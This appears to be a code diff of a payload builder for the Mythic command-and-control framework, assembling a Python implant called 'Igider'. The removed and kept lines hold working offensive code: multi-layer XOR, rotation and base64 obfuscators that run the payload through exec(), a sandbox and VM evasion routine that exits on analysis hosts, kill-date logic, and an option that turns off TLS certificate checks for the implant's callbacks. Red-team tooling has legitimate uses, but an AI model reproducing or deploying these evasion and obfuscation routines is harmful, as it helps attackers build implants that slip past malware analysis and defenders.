@@ -1,3 +1,9 @@
+from mythic_container.PayloadBuilder import *
+from mythic_container.MythicCommandBase import *
+from mythic_container.MythicRPC import *
+from features.obfuscation import basic_obfuscate, advanced_obfuscate
+from features.evasion import add_evasion_features
+from features.compression import compress_code, create_one_liner
 import asyncio
 import pathlib
 import os
@@ -11,12 +17,6 @@ import logging
 from typing import Dict, Any, List, Optional
 from itertools import cycle
 import datetime
-import ssl
-import shutil
-import platform
-from mythic_container.PayloadBuilder import *
-from mythic_container.MythicCommandBase import *
-from mythic_container.MythicRPC import *
 
 class Igider(PayloadType):
     name = "igider"
@@ -36,22 +36,8 @@ class Igider(PayloadType):
             name="output",
             parameter_type=BuildParameterType.ChooseOne,
             description="Choose output format",
-            choices=["py", "base64", "py_compressed", "one_liner", "executable"],
+            choices=["py", "base64", "py_compressed", "one_liner"],
             default_value="py"
-        ),
-        BuildParameter(
-            name="executable_type",
-            parameter_type=BuildParameterType.ChooseOne,
-            description="Standalone executable options (if output=executable)",
-            choices=["onefile", "onedir"],
-            default_value="onefile"
-        ),
-        BuildParameter(
-            name="executable_console",
-            parameter_type=BuildParameterType.ChooseOne,
-            description="Show console window (Windows only)",
-            choices=["True", "False"],
-            default_value="False"
         ),
         BuildParameter(
             name="cryptography_method",
@@ -78,6 +64,7 @@ class Igider(PayloadType):
     
     c2_profiles = ["http", "https"]
     
+    # Use relative paths that can be configured
     _BASE_DIR = pathlib.Path(".")
     
     @property
@@ -110,10 +97,12 @@ class Igider(PayloadType):
         return logger
 
     def get_file_path(self, directory: pathlib.Path, file: str) -> str:
+        """Get the full path to a file, verifying its existence."""
         filename = os.path.join(directory, f"{file}.py")
         return filename if os.path.exists(filename) else ""
     
     async def update_build_step(self, step_name: str, message: str, success: bool = True) -> None:
+        """Helper to update build step status in Mythic UI."""
         try:
             await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                 PayloadUUID=self.uuid,
@@ -125,299 +114,36 @@ class Igider(PayloadType):
             self.logger.error(f"Failed to update build step: {e}")
 
     def _load_module_content(self, module_path: str) -> str:
+        """Safely load content from a module file."""
         try:
-            with open(module_path, "r", encoding="utf-8") as f:
+            with open(module_path, "r") as f:
                 return f.read()
         except Exception as e:
             self.logger.error(f"Error loading module {module_path}: {e}")
             return ""
 
     def _apply_config_replacements(self, code: str, replacements: Dict[str, Any]) -> str:
+        """Apply configuration replacements to code."""
         for key, value in replacements.items():
             if isinstance(value, (dict, list)):
+                # Convert Python objects to JSON, then fix boolean/null values for Python syntax
                 json_val = json.dumps(value).replace("false", "False").replace("true", "True").replace("null", "None")
                 code = code.replace(key, json_val)
             elif value is not None:
                 code = code.replace(key, str(value))
         return code
 
-    def _generate_random_identifier(self, length: int = 8) -> str:
-        return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))
-
-    def _basic_obfuscate(self, code: str) -> str:
-        key = hashlib.md5(os.urandom(128)).hexdigest().encode()
-        encrypted_content = ''.join(chr(c^k) for c,k in zip(code.encode(), cycle(key))).encode()
-        b64_enc_content = base64.b64encode(encrypted_content)
-        xor_func = "chr(c^k)"
-        
-        var_b64 = self._generate_random_identifier()
-        var_key = self._generate_random_identifier()
-        var_iter = self._generate_random_identifier()
-        
-        return f"""import base64, itertools
-{var_b64} = {b64_enc_content}
-{var_key} = {key}
-{var_iter} = itertools.cycle({var_key})
-exec(''.join({xor_func} for c,k in zip(base64.b64decode({var_b64}), {var_iter})).encode())
-"""
-
-    def _advanced_obfuscate(self, code: str) -> str:
-        key1 = hashlib.md5(os.urandom(64)).hexdigest().encode()
-        layer1 = ''.join(chr(c^k) for c,k in zip(code.encode(), cycle(key1)))
-        rotation = random.randint(1, 255)
-        layer2 = ''.join(chr((ord(c) + rotation) % 256) for c in layer1)
-        encoded = base64.b64encode(layer2.encode())
-        
-        var_data = self._generate_random_identifier()
-        var_key = self._generate_random_identifier()
-        var_rot = self._generate_random_identifier()
-        var_result = self._generate_random_identifier()
-        var_char = self._generate_random_identifier()
-        var_k = self._generate_random_identifier()
-        var_c = self._generate_random_identifier()
-        
-        junk1_name = self._generate_random_identifier()
-        junk2_name = self._generate_random_identifier()
-        
-        decoder = f"""
-import base64, itertools, sys, random
-
-def {junk1_name}():
-    return [random.randint(1, 100) for _ in range(10)]
-
-{var_data} = {encoded}
-{var_key} = {key1}
-{var_rot} = {rotation}
-
-def {junk2_name}(x):
-    return ''.join(chr((ord(c) + 13) % 256) for c in x)
-
-{var_result} = ''
-for {var_c}, {var_k} in zip(
-    ''.join(chr((ord({var_char}) - {var_rot}) % 256) for {var_char} in base64.b64decode({var_data}).decode()),
-    itertools.cycle({var_key})
-):
-    {var_result} += chr(ord({var_c}) ^ {var_k})
-
-exec({var_result})
-"""
-        return decoder
-
-    def _compress_code(self, code: str) -> str:
-        import zlib
-        compressed = zlib.compress(code.encode(), level=9)
-        compressed_b64 = base64.b64encode(compressed)
-        
-        return f"""import base64, zlib
-exec(zlib.decompress(base64.b64decode({compressed_b64})))
-"""
-
-    def _create_one_liner(self, code: str) -> str:
-        import re
-        import textwrap
-        
-        code = re.sub(r'#.*$', '', code, flags=re.MULTILINE)
-        code = re.sub(r'""".*?"""', '', code, flags=re.DOTALL)
-        code = re.sub(r"'''.*?'''", '', code, flags=re.DOTALL)
-        
-        lines = []
-        indent_stack = [0]
-        
-        for line in code.split('\n'):
-            line = line.rstrip()
-            if not line.strip():
-                continue
-                
-            current_indent = len(line) - len(line.lstrip())
-            
-            if current_indent > indent_stack[-1]:
-                lines.append('__INDENT__')
-                indent_stack.append(current_indent)
-            elif current_indent < indent_stack[-1]:
-                while current_indent < indent_stack[-1]:
-                    lines.append('__DEDENT__')
-                    indent_stack.pop()
-                if current_indent != indent_stack[-1]:
-                    raise ValueError("Indentation mismatch")
-                    
-            stripped_line = line.strip()
-            if stripped_line.endswith(':'):
-                stripped_line = stripped_line[:-1]
-            lines.append(stripped_line)
-        
-        one_liner = []
-        indent_level = 0
-        
-        for line in lines:
-            if line == '__INDENT__':
-                indent_level += 1
-            elif line == '__DEDENT__':
-                indent_level -= 1
-            else:
-                one_liner.append(line)
-        
-        result = ';'.join(one_liner)
-        result = re.sub(r';{2,}', ';', result)
-        result = re.sub(r';\s*(?=[)\]}]|$)', '', result)
-        result = re.sub(r'(if|while|for|def|class|try|except|finally|else|elif)\s*\(', r'\1 ', result)
-        
-        return result
-
-    def _add_evasion_features(self, code: str) -> str:
-        evasion_code = []
-        try:
-            kill_date = self.c2info[0].get_parameters_dict().get("killdate", "").strip()
-            if kill_date:
-                try:
-                    datetime.datetime.strptime(kill_date, "%Y-%m-%d")
-                    evasion_code.append(f"""
-import datetime
-if datetime.datetime.now() > datetime.datetime.strptime("{kill_date}", "%Y-%m-%d"):
-    import sys
-    sys.exit(0)
-""")
-                except ValueError as e:
-                    self.logger.warning(f"Invalid killdate format (should be YYYY-MM-DD): {e}")
-        except (IndexError, AttributeError, TypeError) as e:
-            self.logger.debug(f"Could not retrieve kill_date: {e}")
-
-        evasion_code.append("""
-import os
-def check_environment():
-    import os
-    import sys
-    import socket
-    import platform
-    import subprocess
-    
-    suspicious_indicators = {
-        'hostnames': ['sandbox', 'analysis', 'malware', 'cuckoo', 'vm', 'vbox', 'virtual'],
-        'users': ['user', 'sandbox', 'vmuser'],
-        'processes': ['vmtoolsd', 'vmwaretray', 'vboxservice']
-    }
-    
-    try:
-        hostname = socket.gethostname().lower()
-        if any(name in hostname for name in suspicious_indicators['hostnames']):
-            return False
-    except:
-        pass
-    
-    try:
-        username = os.getenv("USER", "").lower()
-        if any(user in username for user in suspicious_indicators['users']):
-            return False
-    except:
-        pass
-    
-    try:
-        if platform.system().lower() == 'windows':
-            import ctypes
-            try:
-                free_bytes = ctypes.c_ulonglong(0)
-                ctypes.windll.kernel32.GetDiskFreeSpaceExW(
-                    ctypes.c_wchar_p('C:\\\\'), 
-                    None, 
-                    None, 
-                    ctypes.pointer(free_bytes)
-                )
-                if free_bytes.value < 21474836480:  # 20 GB
-                    return False
-            except:
-                pass
-            
-            try:
-                import wmi
-                c = wmi.WMI()
-                for process in c.Win32_Process():
-                    if process.Name.lower() in suspicious_indicators['processes']:
-                        return False
-            except:
-                pass
-                
-        else:
-            import shutil
-            try:
-                if shutil.disk_usage("/").free < 21474836480:  # 20 GB
-                    return False
-            except:
-                pass
-            
-            try:
-                ps = subprocess.Popen(['ps', '-aux'], stdout=subprocess.PIPE)
-                output = subprocess.check_output(['grep', '-i'] + suspicious_indicators['processes'], stdin=ps.stdout)
-                if output:
-                    return False
-            except:
-                pass
-                
-    except Exception:
-        pass
-    
-    return True
-
-if not check_environment() or os.getenv("BUILD_VALIDATION") == "true":
-    import sys
-    sys.exit(0)
-""")
-    
-        return "\n".join(evasion_code) + "\n" + code
-
     async def build(self) -> BuildResponse:
+        """Build the Igider payload with the specified configuration."""
         resp = BuildResponse(status=BuildStatus.Success)
         build_errors = []
         
         try:
-            await self.update_build_step("Initializing Build", f"Starting build process on {platform.system()}...")
-            
-            # Verify build environment for Windows executables
-            if self.selected_os == SupportedOS.Windows and platform.system().lower() != "windows":
-                if os.getenv("MYTHIC_IGNORE_WINE_CHECK") != "true":
-                    try:
-                        # Check wine command
-                        proc = await asyncio.create_subprocess_exec(
-                            "wine", "--version",
-                            stdout=asyncio.subprocess.PIPE,
-                            stderr=asyncio.subprocess.PIPE
-                        )
-                        stdout, stderr = await proc.communicate()
-                        if proc.returncode != 0:
-                            error_msg = (
-                                "Wine is required for cross-compiling Windows executables on non-Windows hosts. "
-                                "If running Mythic in Docker, add 'RUN apt-get update && apt-get install -y wine' to the payload Dockerfile and rebuild with './mythic-cli rebuild'. "
-                                "If running on a host, install Wine using 'sudo apt-get install wine' (Ubuntu/Debian) or equivalent for your OS."
-                            )
-                            raise Exception(error_msg)
-                        wine_version = stdout.decode().strip()
-                        self.logger.info(f"Wine version: {wine_version}")
-                        
-                        # Check wine32 availability
-                        proc = await asyncio.create_subprocess_exec(
-                            "wine", "winepath", "-w", "/tmp",
-                            stdout=asyncio.subprocess.PIPE,
-                            stderr=asyncio.subprocess.PIPE
-                        )
-                        stdout, stderr = await proc.communicate()
-                        if proc.returncode != 0 or "wine32 is missing" in stderr.decode():
-                            error_msg = (
-                                "wine32 is required for cross-compiling 32-bit Windows executables. "
-                                "If running Mythic in Docker, add 'RUN dpkg --add-architecture i386 && apt-get update && apt-get install -y wine wine32:i386' to the payload Dockerfile and rebuild with './mythic-cli rebuild'. "
-                                "If running on a host, run 'sudo dpkg --add-architecture i386 && sudo apt-get update && sudo apt-get install wine32:i386'."
-                            )
-                            raise Exception(error_msg)
-                        self.logger.info("wine32 check passed")
-                    except Exception as e:
-                        self.logger.error(f"Build environment check failed: {str(e)}")
-                        await self.update_build_step("Initializing Build", f"Build environment check failed: {str(e)}", False)
-                        resp.set_status(BuildStatus.Error)
-                        resp.build_stderr = f"Build environment check failed: {str(e)}"
-                        return resp
-                else:
-                    self.logger.warning("Wine check bypassed with MYTHIC_IGNORE_WINE_CHECK=true. Windows executable may not build correctly.")
-                    await self.update_build_step("Initializing Build", "Warning: Wine check bypassed. Build may fail.", True)
-            
+            # Step 1: Initialize build
+            await self.update_build_step("Initializing Build", "Starting build process...")
+            # Step 2: Gather components
             await self.update_build_step("Gathering Components", "Loading agent modules...")
-            
+                # Load base agent code
             base_agent_path = self.get_file_path(os.path.join(self.agent_code_path, "base_agent"), "base_agent")
             if not base_agent_path:
                 build_errors.append("Base agent code not found")
@@ -427,19 +153,15 @@ if not check_environment() or os.getenv("BUILD_VALIDATION") == "true":
                 return resp
                 
             base_code = self._load_module_content(base_agent_path)
-            if not base_code:
-                build_errors.append("Base agent code is empty")
-                await self.update_build_step("Gathering Components", "Base agent code is empty", False)
-                resp.set_status(BuildStatus.Error)
-                resp.build_stderr = "\n".join(build_errors)
-                return resp
             
+            #############################################################################################
+            # Load appropriate crypto module
             crypto_method = self.get_parameter("cryptography_method")
             if crypto_method == "cryptography_lib":
                 crypto_path = self.get_file_path(os.path.join(self.agent_code_path, "base_agent"), "crypto_lib")
             elif crypto_method == "pycryptodome":
                 crypto_path = self.get_file_path(os.path.join(self.agent_code_path, "base_agent"), "pycrypto_lib")
-            else:
+            else:  # default to manual
                 crypto_path = self.get_file_path(os.path.join(self.agent_code_path, "base_agent"), "manual_crypto")
                 
             if not crypto_path:
@@ -447,7 +169,8 @@ if not check_environment() or os.getenv("BUILD_VALIDATION") == "true":
                 crypto_code = "# Error loading crypto module"
             else:
                 crypto_code = self._load_module_content(crypto_path)
-            
+            ###############################################################################################
+                # Load command modules
             command_code = ""
             for cmd in self.commands.get_commands():
                 command_path = self.get_file_path(self.agent_code_path, cmd)
@@ -456,221 +179,68 @@ if not check_environment() or os.getenv("BUILD_VALIDATION") == "true":
                 else:
                     command_code += self._load_module_content(command_path) + "\n"
             
+            # Step 3: Configure agent
             await self.update_build_step("Configuring Agent", "Applying agent configuration...")
             
+                # Replace placeholders with actual code/config
             base_code = base_code.replace("CRYPTO_MODULE_PLACEHOLDER", crypto_code)
             base_code = base_code.replace("UUID_HERE", self.uuid)
             base_code = base_code.replace("#COMMANDS_PLACEHOLDER", command_code)
             
+            
+                # Process C2 profile configuration
             for c2 in self.c2info:
                 profile = c2.get_c2profile()["name"]
                 base_code = self._apply_config_replacements(base_code, c2.get_parameters_dict())
             
+            # Configure HTTPS certificate validation
             if self.get_parameter("https_check") == "No":
                 base_code = base_code.replace("urlopen(req)", "urlopen(req, context=gcontext)")
                 base_code = base_code.replace("#CERTSKIP", 
-                    """
+                """
         gcontext = ssl.create_default_context()
         gcontext.check_hostname = False
         gcontext.verify_mode = ssl.CERT_NONE\n""")
             else:
                 base_code = base_code.replace("#CERTSKIP", "")
             
+            # Step 4: Apply obfuscation
             await self.update_build_step("Applying Obfuscation", "Implementing code obfuscation...")
-            
-            base_code = self._add_evasion_features(base_code)
-            
+                # Add evasion features first
+            base_code = add_evasion_features(base_code)
+                # Apply obfuscation based on selected level
             obfuscation_level = self.get_parameter("obfuscation_level")
             if obfuscation_level == "advanced":
-                base_code = self._advanced_obfuscate(base_code)
+                base_code = advanced_obfuscate(base_code)
                 await self.update_build_step("Applying Obfuscation", "Advanced obfuscation applied successfully")
             elif obfuscation_level == "basic":
-                base_code = self._basic_obfuscate(base_code)
+                base_code = basic_obfuscate(base_code)
                 await self.update_build_step("Applying Obfuscation", "Basic obfuscation applied successfully")
-            else:
+            else:  # none
                 await self.update_build_step("Applying Obfuscation", "No obfuscation requested, skipping")
             
+            # Step 5: Finalize payload format
             await self.update_build_step("Finalizing Payload", "Preparing output in requested format...")
             
             output_format = self.get_parameter("output")
-            file_ext = ".exe" if self.selected_os == SupportedOS.Windows else ""
             if output_format == "base64":
                 resp.payload = base64.b64encode(base_code.encode())
-                resp.filename = "payload.b64"
                 resp.build_message = "Successfully built payload in base64 format"
             elif output_format == "py_compressed":
-                compressed_code = self._compress_code(base_code)
+                compressed_code = compress_code(base_code)
                 resp.payload = compressed_code.encode()
-                resp.filename = "payload.py"
                 resp.build_message = "Successfully built compressed Python payload"
             elif output_format == "one_liner":
-                one_liner = self._create_one_liner(base_code)
+                one_liner = create_one_liner(base_code)
                 resp.payload = one_liner.encode()
-                resp.filename = "payload.py"
                 resp.build_message = "Successfully built one-liner payload"
-            elif output_format == "executable":
-                await self.update_build_step("Finalizing Payload", "Building standalone executable...")
-                
-                tmp_dir = tempfile.mkdtemp()
-                try:
-                    os.chmod(tmp_dir, 0o755)
-                    self.logger.debug(f"Created temporary directory: {tmp_dir}")
-                    
-                    py_path = os.path.join(tmp_dir, "payload.py")
-                    with open(py_path, "w", encoding="utf-8") as f:
-                        f.write(base_code)
-                    os.chmod(py_path, 0o644)
-                    self.logger.debug(f"Wrote payload to {py_path}, content length: {len(base_code)} bytes")
-                    
-                    if obfuscation_level in ["basic", "advanced"]:
-                        try:
-                            proc = await asyncio.create_subprocess_exec(
-                                "python3", py_path,
-                                stdout=asyncio.subprocess.PIPE,
-                                stderr=asyncio.subprocess.PIPE,
-                                env={**os.environ, "BUILD_VALIDATION": "true"}
-                            )
-                            stdout, stderr = await proc.communicate()
-                            if proc.returncode != 0:
-                                self.logger.error(f"Obfuscated code validation failed: {stderr.decode()}")
-                                raise Exception(f"Obfuscated code is invalid: {stderr.decode()}")
-                        except Exception as e:
-                            self.logger.error(f"Obfuscation validation failed: {str(e)}")
-                            await self.update_build_step("Finalizing Payload", f"Obfuscation validation failed: {str(e)}", False)
-                            resp.set_status(BuildStatus.Error)
-                            resp.build_stderr = f"Obfuscation validation failed: {str(e)}"
-                            return resp
-                    
-                    pyinstaller_cmd = [
-                        "python3", "-m", "PyInstaller",
-                        "--name=payload",
-                        "--clean",
-                        "--noconfirm",
-                        "--log-level=DEBUG",
-                        "--distpath", os.path.join(tmp_dir, "dist"),
-                        "--workpath", os.path.join(tmp_dir, "build"),
-                        "--specpath", tmp_dir
-                    ]
-                    
-                    if self.selected_os == SupportedOS.Windows:
-                        pyinstaller_cmd.extend(["--icon=NONE"])
-                        if self.get_parameter("executable_console") == "False":
-                            pyinstaller_cmd.append("--noconsole")
-                        pyinstaller_cmd.append(f"--name=payload.exe")
-                    build_mode = self.get_parameter("executable_type")
-                    if build_mode == "onefile":
-                        pyinstaller_cmd.append("--onefile")
-                    else:
-                        pyinstaller_cmd.append("--onedir")
-                    
-                    pyinstaller_cmd.append(py_path)
-                    
-                    self.logger.debug(f"Running PyInstaller with command: {' '.join(pyinstaller_cmd)}")
-                    proc = await asyncio.create_subprocess_exec(
-                        *pyinstaller_cmd,
-                        stdout=asyncio.subprocess.PIPE,
-                        stderr=asyncio.subprocess.PIPE
-                    )
-                    stdout, stderr = await proc.communicate()
-                    
-                    stdout_text = stdout.decode() if stdout else ""
-                    stderr_text = stderr.decode() if stderr else ""
-                    self.logger.debug(f"PyInstaller stdout: {stdout_text}")
-                    self.logger.debug(f"PyInstaller stderr: {stderr_text}")
-                    
-                    if proc.returncode != 0:
-                        self.logger.error(f"PyInstaller failed: {stderr_text or stdout_text}")
-                        await self.update_build_step("Finalizing Payload", f"PyInstaller failed: {stderr_text or stdout_text}", False)
-                        resp.set_status(BuildStatus.Error)
-                        resp.build_stderr = f"PyInstaller failed: {stderr_text or stdout_text}"
-                        return resp
-                    
-                    dist_dir = os.path.join(tmp_dir, "dist")
-                    if not os.path.exists(dist_dir):
-                        self.logger.error(f"dist directory not created: {dist_dir}")
-                        await self.update_build_step("Finalizing Payload", f"dist directory not created: {dist_dir}", False)
-                        resp.set_status(BuildStatus.Error)
-                        resp.build_stderr = f"dist directory not created: {dist_dir}"
-                        return resp
-                    
-                    dir_contents = os.listdir(dist_dir)
-                    if not dir_contents:
-                        self.logger.error(f"dist directory is empty: {dist_dir}")
-                        await self.update_build_step("Finalizing Payload", f"dist directory is empty: {dist_dir}", False)
-                        resp.set_status(BuildStatus.Error)
-                        resp.build_stderr = f"dist directory is empty: {dist_dir}"
-                        return resp
-                    
-                    executable_found = False
-                    executable_path = None
-                    for root, _, files in os.walk(dist_dir):
-                        for file in files:
-                            if (self.selected_os == SupportedOS.Windows and (file == "payload" or file.endswith("payload.exe"))) or \
-                               (self.selected_os != SupportedOS.Windows and file == "payload"):
-                                executable_path = os.path.join(root, file)
-                                if os.path.isfile(executable_path):
-                                    os.chmod(executable_path, 0o755)
-                                    file_stat = os.stat(executable_path)
-                                    self.logger.info(f"Found executable: {executable_path}, size: {file_stat.st_size}, permissions: {oct(file_stat.st_mode)[-3:]}")
-                                    if file_stat.st_size == 0:
-                                        self.logger.error(f"Executable {executable_path} is empty")
-                                        await self.update_build_step("Finalizing Payload", f"Executable {executable_path} is empty", False)
-                                        resp.set_status(BuildStatus.Error)
-                                        resp.build_stderr = f"Executable {executable_path} is empty"
-                                        return resp
-                                    if self.selected_os == SupportedOS.Windows and file == "payload":
-                                        new_path = os.path.join(root, "payload.exe")
-                                        os.rename(executable_path, new_path)
-                                        executable_path = new_path
-                                        self.logger.info(f"Renamed {file} to payload.exe for Windows")
-                                    with open(executable_path, "rb") as f:
-                                        resp.payload = f.read()
-                                    resp.filename = f"payload{file_ext}"
-                                    resp.build_message = f"Successfully built {build_mode} executable at {executable_path}"
-                                    executable_found = True
-                                    break
-                        if executable_found:
-                            break
-                    
-                    if not executable_found:
-                        detailed_dir_structure = {}
-                        for root, dirs, files in os.walk(tmp_dir):
-                            rel_path = os.path.relpath(root, tmp_dir)
-                            file_info = [
-                                {
-                                    "name": f,
-                                    "size": os.path.getsize(os.path.join(root, f)),
-                                    "perms": oct(os.stat(os.path.join(root, f)).st_mode)[-3:],
-                                    "executable": os.access(os.path.join(root, f), os.X_OK)
-                                } for f in files
-                            ]
-                            detailed_dir_structure[rel_path] = {"dirs": dirs, "files": file_info}
-                        self.logger.error(f"Detailed directory structure: {json.dumps(detailed_dir_structure, indent=2)}")
-                        await self.update_build_step("Finalizing Payload", f"Failed to find executable in {dist_dir}. Contents: {dir_contents}", False)
-                        resp.set_status(BuildStatus.Error)
-                        resp.build_stderr = f"Failed to find executable in {dist_dir}. Contents: {dir_contents}"
-                        return resp
-                    
-                except Exception as e:
-                    self.logger.error(f"Executable build failed: {str(e)}", exc_info=True)
-                    await self.update_build_step("Finalizing Payload", f"Executable build failed: {str(e)}", False)
-                    resp.set_status(BuildStatus.Error)
-                    resp.build_stderr = f"Error building executable: {str(e)}\nPyInstaller stdout: {stdout_text}\nPyInstaller stderr: {stderr_text}"
-                    return resp
-                finally:
-                    shutil.rmtree(tmp_dir, ignore_errors=True)
+            else:  # default to py
+                resp.payload = base_code.encode()
+                resp.build_message = "Successfully built Python script payload"
             
-            else:
-                self.logger.error(f"Invalid output format: {output_format}")
-                await self.update_build_step("Finalizing Payload", f"Invalid output format: {output_format}", False)
-                resp.set_status(BuildStatus.Error)
-                resp.build_stderr = f"Invalid output format: {output_format}"
-                return resp
-            
+            # Report any non-fatal errors
             if build_errors:
                 resp.build_stderr = "Warnings during build:\n" + "\n".join(build_errors)
-            
-            await self.update_build_step("Finalizing Payload", f"Payload ready for download as {resp.filename}", True)
             
         except Exception as e:
             self.logger.error(f"Build failed: {str(e)}")
